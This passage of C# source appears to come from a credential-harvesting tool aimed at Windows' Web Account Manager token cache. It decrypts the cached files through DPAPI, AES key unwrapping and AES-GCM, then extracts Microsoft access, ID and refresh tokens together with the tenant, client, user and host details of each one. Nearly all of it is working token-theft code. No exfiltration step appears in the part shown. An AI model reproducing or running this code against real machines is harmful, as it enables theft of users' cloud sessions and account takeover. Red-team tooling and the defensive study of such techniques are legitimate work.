                token.TenantId = guids[1];
        }

        /// <summary>
        /// Extract tenant_id and client_id from Microsoft Refresh Token v1 format
        /// Format: 1.AV0A[tenant_id_base64url][client_id_base64url]...
        /// IMPORTANT: Must decode 44 chars TOGETHER, not separately!
        /// </summary>
        static void ExtractMetadataFromRefreshToken(string refreshToken, InternalToken token)
        {
            if (string.IsNullOrEmpty(refreshToken) || !refreshToken.StartsWith("1."))
                return;

            try
            {
                // Remove "1." prefix and get the first part before any dots
                string tokenBody = refreshToken.Substring(2);
                int dotIndex = tokenBody.IndexOf('.');
                if (dotIndex > 0)
                    tokenBody = tokenBody.Substring(0, dotIndex);

                // Skip 4-char header if present (AV0A = legacy, AQwA/ATAA = current format)
                if (tokenBody.StartsWith("AV0A") || tokenBody.StartsWith("AQwA") || tokenBody.StartsWith("ATAA"))
                    tokenBody = tokenBody.Substring(4);

                // We need at least 44 chars for tenant (22) + client (22)
                if (tokenBody.Length < 44)
                    return;

                // Decode all 44 chars together to preserve base64 alignment
                string combined = tokenBody.Substring(0, 44);
                byte[] decoded = Base64UrlDecode(combined);
                
                // We need at least 32 bytes (16 for tenant + 16 for client)
                if (decoded.Length >= 32)
                {
                    string tenantId = FormatGuidFromBytes(decoded, 0);
                    if (!string.IsNullOrEmpty(tenantId) && GuidPattern.IsMatch(tenantId))
                        token.TenantId = tenantId;

                    string clientId = FormatGuidFromBytes(decoded, 16);
                    if (!string.IsNullOrEmpty(clientId) && GuidPattern.IsMatch(clientId))
                        token.ClientId = clientId;
                }
            }
            catch
            {
                // Silently fail - metadata will be extracted from raw data as fallback
            }
        }

        /// <summary>
        /// Format a GUID from little-endian bytes
        /// </summary>
        static string FormatGuidFromBytes(byte[] bytes, int offset)
        {
            if (bytes.Length < offset + 16)
                return null;

            return $"{bytes[offset + 3]:x2}{bytes[offset + 2]:x2}{bytes[offset + 1]:x2}{bytes[offset + 0]:x2}-" +
                   $"{bytes[offset + 5]:x2}{bytes[offset + 4]:x2}-" +
                   $"{bytes[offset + 7]:x2}{bytes[offset + 6]:x2}-" +
                   $"{bytes[offset + 8]:x2}{bytes[offset + 9]:x2}-" +
                   $"{bytes[offset + 10]:x2}{bytes[offset + 11]:x2}{bytes[offset + 12]:x2}{bytes[offset + 13]:x2}{bytes[offset + 14]:x2}{bytes[offset + 15]:x2}";
        }

        static string ExtractRawData(byte[] processedData)
        {
            if (processedData == null || processedData.Length == 0)
                return null;

            string rawData;

            if (processedData[0] == HEADER_JSON)
            {
                byte[] sansHeader = new byte[processedData.Length - 8];
                Buffer.BlockCopy(processedData, 8, sansHeader, 0, sansHeader.Length);
                rawData = Encoding.UTF8.GetString(sansHeader);
            }
            else
            {
                rawData = Encoding.UTF8.GetString(processedData);
                
                if (rawData.Count(c => char.IsControl(c) && c != '\n' && c != '\r' && c != '\t') > rawData.Length / 4)
                {
                    var strings = ExtractLengthPrefixedStrings(processedData);
                    rawData = string.Join("\n", strings);
                }
            }

            return rawData;
        }

        static byte[] ProcessWAMFile(string filePath)
        {
            byte[] pBuffer = ExtractInitialBlob(filePath);
            if (pBuffer == null) return null;

            var cngDecoded = DecodeCngBlob(pBuffer);

            var unprotectedKey = ProtectedData.Unprotect(cngDecoded.Kek, null, DataProtectionScope.CurrentUser);

            var unwrappedKey = RFC3394_UnwrapAesKey(unprotectedKey, cngDecoded.EncryptedCEK);

            var ciphertext = new byte[cngDecoded.EncryptedContent.Length - 16];
            var tag = new byte[16];

            Buffer.BlockCopy(cngDecoded.EncryptedContent, 0, ciphertext, 0, ciphertext.Length);
            Buffer.BlockCopy(cngDecoded.EncryptedContent, ciphertext.Length, tag, 0, 16);

            var decryptedContent = DecryptAesGcm_BouncyCastle(unwrappedKey, cngDecoded.Iv, ciphertext, tag);

            byte[] sansSix = new byte[decryptedContent.Length - 6];
            Buffer.BlockCopy(decryptedContent, 6, sansSix, 0, sansSix.Length);

            var deflated = DecompressDeflateRaw(sansSix);
            return deflated;
        }

        #endregion

        #region Common Parsing

        static InternalToken ParseDecryptedContent(string fileName, string decryptedText, string sourceType, string extractedAt, string filePath)
        {
            var token = new InternalToken
            {
                SourceType = sourceType,
                SourceFile = fileName,
                ExtractedAt = extractedAt,
                ExtractedFrom = Hostname,
                CachePath = filePath
            };

            // Extract JWTs
            var jwtMatches = JwtPattern.Matches(decryptedText);
            var jwts = jwtMatches.Cast<Match>().Select(m => m.Groups[1].Value).ToList();

            // First JWT is typically ID Token, second is Access Token
            if (jwts.Count > 0)
                token.IdToken = jwts[0];
            if (jwts.Count > 1)
                token.AccessToken = jwts[1];

            // Parse JWT first to extract accurate client_id and metadata
            string jwtToParse = token.AccessToken ?? token.IdToken;
            if (!string.IsNullOrEmpty(jwtToParse))
                ParseJWTIntoToken(jwtToParse, token);

            // THEN extract remaining metadata (won't overwrite client_id)
            ExtractMetadataFromRaw(decryptedText, token);

            // Extract scope from content
            var scopeMatch = Regex.Match(decryptedText, @"[""']?scope[""']?\s*[:=]\s*[""']?([^""'\r\n]+)[""']?", RegexOptions.IgnoreCase);
            if (scopeMatch.Success && string.IsNullOrEmpty(token.Scope))
                token.Scope = scopeMatch.Groups[1].Value.Trim();

            // Only return if we have useful data
            if (!string.IsNullOrEmpty(token.AccessToken) ||
                !string.IsNullOrEmpty(token.IdToken))
            {
                return token;
            }

            return null;
        }

        static void ParseJWTIntoToken(string jwt, InternalToken token)
        {
            try
            {
                var parts = jwt.Split('.');
                if (parts.Length < 2) return;

                string payloadJson = Encoding.UTF8.GetString(Base64UrlDecode(parts[1]));

                using var doc = JsonDocument.Parse(payloadJson);
                var root = doc.RootElement;

                if (string.IsNullOrEmpty(token.Upn))
                    token.Upn = TryGetJsonString(root, "upn", "unique_name", "email", "preferred_username");

                if (string.IsNullOrEmpty(token.TenantId))
                    token.TenantId = TryGetJsonString(root, "tid", "tenant_id");

                // Client ID from JWT - use appid first (most accurate), then azp, then aud
                if (string.IsNullOrEmpty(token.ClientId))
                    token.ClientId = TryGetJsonString(root, "appid", "azp", "client_id");
                
                // Only use aud as fallback if it's a GUID (not a URL)
                if (string.IsNullOrEmpty(token.ClientId))
                {
                    string aud = TryGetJsonString(root, "aud");
                    if (!string.IsNullOrEmpty(aud) && GuidPattern.IsMatch(aud))
                        token.ClientId = aud;
                }

                if (string.IsNullOrEmpty(token.Scope))
                    token.Scope = TryGetJsonString(root, "scp", "scope");

                // Extract display name
                if (string.IsNullOrEmpty(token.DisplayName))
                    token.DisplayName = TryGetJsonString(root, "name");

                // Extract user OID
                if (string.IsNullOrEmpty(token.UserOid))
                    token.UserOid = TryGetJsonString(root, "oid");

                if (root.TryGetProperty("exp", out var exp))
                {
                    long expTimestamp = exp.GetInt64();
                    var expiresAt = DateTimeOffset.FromUnixTimeSeconds(expTimestamp).LocalDateTime;
                    token.ExpiresAt = expiresAt.ToString("yyyy-MM-dd HH:mm:ss");
                    token.IsExpired = expiresAt < DateTime.Now;
                }
            }
            catch { }
        }

        static string TryGetJsonString(JsonElement root, params string[] propertyNames)
        {
            foreach (var name in propertyNames)
            {
                if (root.TryGetProperty(name, out var prop) && prop.ValueKind == JsonValueKind.String)
                    return prop.GetString();
            }
            return null;
        }

        #endregion

        #region Crypto Functions

        static byte[] ExtractInitialBlob(string path)
        {
            if (!File.Exists(path)) return null;

            byte[] fileBytes = File.ReadAllBytes(path);

            var utf8Bom = new byte[3] { 0xEF, 0xBB, 0xBF };
            var encryptedSignature = Encoding.UTF8.GetBytes("3-1");

            var hasUtf8Bom = fileBytes.Take(3).SequenceEqual(utf8Bom);

            if (hasUtf8Bom)
                fileBytes = fileBytes.Skip(3).ToArray();

            var isSignatureSupported = fileBytes.Take(3).SequenceEqual(encryptedSignature);

            if (!isSignatureSupported)
                return null;

            var withoutHeader = fileBytes.Skip(3).ToArray();
            var base64String = Encoding.UTF8.GetString(withoutHeader);

            return Convert.FromBase64String(base64String);
        }

        static CngBlobAsn1 DecodeCngBlob(byte[] buffer)
        {
            CngBlobAsn1 blob = new CngBlobAsn1();

            var reader = new AsnReader(buffer, AsnEncodingRules.DER);
            var contentInfoSeq = reader.ReadSequence();
            var contentTypeOid = contentInfoSeq.ReadObjectIdentifier();

            if (contentTypeOid != "1.2.840.113549.1.7.3")
                throw new InvalidOperationException("Not EnvelopedData");

            var envelopedDataExplicit = contentInfoSeq.ReadEncodedValue();
            var envelopedReader = new AsnReader(envelopedDataExplicit, AsnEncodingRules.DER);
            var envelopedExplicit = envelopedReader.ReadSequence(new Asn1Tag(TagClass.ContextSpecific, 0));

            var envelopedSeq = envelopedExplicit.ReadSequence();
            int version = (int)envelopedSeq.ReadInteger();

            var recipientInfosSet = envelopedSeq.ReadSetOf();

            while (recipientInfosSet.HasData)
            {
                var recipientTagged = recipientInfosSet.ReadEncodedValue();
                var recipientReader = new AsnReader(recipientTagged, AsnEncodingRules.DER);

                var tag = recipientReader.PeekTag();

                if (tag.TagClass == TagClass.ContextSpecific && tag.TagValue == 2)
                {
                    var kekExplicit = recipientReader.ReadSequence(new Asn1Tag(TagClass.ContextSpecific, 2));
                    int kekVersion = (int)kekExplicit.ReadInteger();

                    var kekIdSeq = kekExplicit.ReadSequence();
                    var keyId = kekIdSeq.ReadOctetString();

                    var algSeq = kekExplicit.ReadSequence();
                    var algOid = algSeq.ReadObjectIdentifier();
                    var encryptedKey = kekExplicit.ReadOctetString();

                    blob.Kek = keyId;
                    blob.EncryptedCEK = encryptedKey;
                }
            }

            var encryptedContentInfoSeq = envelopedSeq.ReadSequence();
            var contentDataOid = encryptedContentInfoSeq.ReadObjectIdentifier();
            var contentAlgSeq = encryptedContentInfoSeq.ReadSequence();
            var contentAlgOid = contentAlgSeq.ReadObjectIdentifier();

            var algParamsSeq = contentAlgSeq.ReadSequence();
            var iv = algParamsSeq.ReadOctetString();
            var authTagLen = algParamsSeq.ReadInteger();

            var encryptedContent = encryptedContentInfoSeq.ReadOctetString(new Asn1Tag(TagClass.ContextSpecific, 0));

            blob.Iv = iv;
            blob.EncryptedContent = encryptedContent;
            return blob;
        }

        static byte[] RFC3394_UnwrapAesKey(byte[] kek, byte[] wrappedKey)
        {
            var engine = new AesWrapEngine();
            engine.Init(false, new KeyParameter(kek));
            return engine.Unwrap(wrappedKey, 0, wrappedKey.Length);
        }

        static byte[] DecryptAesGcm_BouncyCastle(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag)
        {
            var gcm = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(key), tag.Length * 8, iv, null);
            gcm.Init(false, parameters);

            byte[] input = new byte[ciphertext.Length + tag.Length];
            Buffer.BlockCopy(ciphertext, 0, input, 0, ciphertext.Length);
            Buffer.BlockCopy(tag, 0, input, ciphertext.Length, tag.Length);

            byte[] output = new byte[gcm.GetOutputSize(input.Length)];
            int len = gcm.ProcessBytes(input, 0, input.Length, output, 0);
            gcm.DoFinal(output, len);

            return output;
        }

        static byte[] DecompressDeflateRaw(byte[] data)
        {
            using var input = new MemoryStream(data);
            using var deflate = new DeflateStream(input, CompressionMode.Decompress);
            using var output = new MemoryStream();
            deflate.CopyTo(output);
            return output.ToArray();
        }

        static byte[] Base64UrlDecode(string input)
        {
            string base64 = input.Replace('-', '+').Replace('_', '/');
            switch (base64.Length % 4)
            {
                case 2: base64 += "=="; break;
                case 3: base64 += "="; break;
            }
            return Convert.FromBase64String(base64);
        }

        #endregion

        #region Utility Functions

        static List<string> GetAllFilesRecursive(string rootPath)
        {
            var files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(rootPath));
                foreach (var dir in Directory.GetDirectories(rootPath))
                {
                    files.AddRange(GetAllFilesRecursive(dir));
                }
            }
            catch { }
            return files;
        }

        static List<string> ExtractLengthPrefixedStrings(byte[] buffer)
        {
            var result = new List<string>();
            int offset = 0;

            while (offset <= buffer.Length - 4)
            {
                uint length = BitConverter.ToUInt32(buffer, offset);
                int stringDataOffset = offset + 4;
                int remainingBytes = buffer.Length - stringDataOffset;

                if (length > 0 && length <= remainingBytes && length < 10000)
                {
                    try
                    {
                        string s = Encoding.UTF8.GetString(buffer, stringDataOffset, (int)length);
                        if (!s.Contains('\0') && IsPrintable(s))
                            result.Add(s);
                    }
                    catch { }
                }
                offset += 1;
            }
            return result;
        }

        static bool IsPrintable(string s) => s.All(c => !char.IsControl(c) || c == '\r' || c == '\n' || c == '\t');

        #endregion

        #region Publisher Hash

        static string GetPublisherId(string publisher)
        {
            using var sha256 = SHA256.Create();
            byte[] hash = sha256.ComputeHash(Encoding.Unicode.GetBytes(publisher));
            return Base32EncodePublisher(hash, 8);
        }

        static string Base32EncodePublisher(byte[] bytes, uint byteCount)
        {
            char[] base32DigitList = "0123456789abcdefghjkmnpqrstvwxyz".ToCharArray();
            uint numBits = byteCount * 8;
            uint wcharCount = numBits / 5;
            if (numBits % 5 != 0) ++wcharCount;

            char[] wchars = new char[wcharCount];
            uint wcharsIdx = 0;

            for (uint byteIdx = 0; byteIdx < byteCount; byteIdx += 5)
            {
                byte firstByte = bytes[byteIdx];
                byte secondByte = (byteIdx + 1) < byteCount ? bytes[byteIdx + 1] : (byte)0;
                wchars[wcharsIdx++] = base32DigitList[(firstByte & 0xF8) >> 3];
                wchars[wcharsIdx++] = base32DigitList[((firstByte & 0x07) << 2) | ((secondByte & 0xC0) >> 6)];

                if (byteIdx + 1 < byteCount)
                {
                    byte thirdByte = (byteIdx + 2) < byteCount ? bytes[byteIdx + 2] : (byte)0;
                    wchars[wcharsIdx++] = base32DigitList[(secondByte & 0x3E) >> 1];
                    wchars[wcharsIdx++] = base32DigitList[((secondByte & 0x01) << 4) | ((thirdByte & 0xF0) >> 4)];

                    if (byteIdx + 2 < byteCount)
                    {
                        byte fourthByte = (byteIdx + 3) < byteCount ? bytes[byteIdx + 3] : (byte)0;
                        wchars[wcharsIdx++] = base32DigitList[((thirdByte & 0x0F) << 1) | ((fourthByte & 0x80) >> 7)];

                        if (byteIdx + 3 < byteCount)
                        {
                            byte fifthByte = (byteIdx + 4) < byteCount ? bytes[byteIdx + 4] : (byte)0;
                            wchars[wcharsIdx++] = base32DigitList[(fourthByte & 0x7C) >> 2];
                            wchars[wcharsIdx++] = base32DigitList[((fourthByte & 0x03) << 3) | ((fifthByte & 0xE0) >> 5)];

                            if (byteIdx + 4 < byteCount)
                                wchars[wcharsIdx++] = base32DigitList[fifthByte & 0x1F];
                        }
                    }
                }
            }
            return new string(wchars);
        }

        #endregion
    }
}
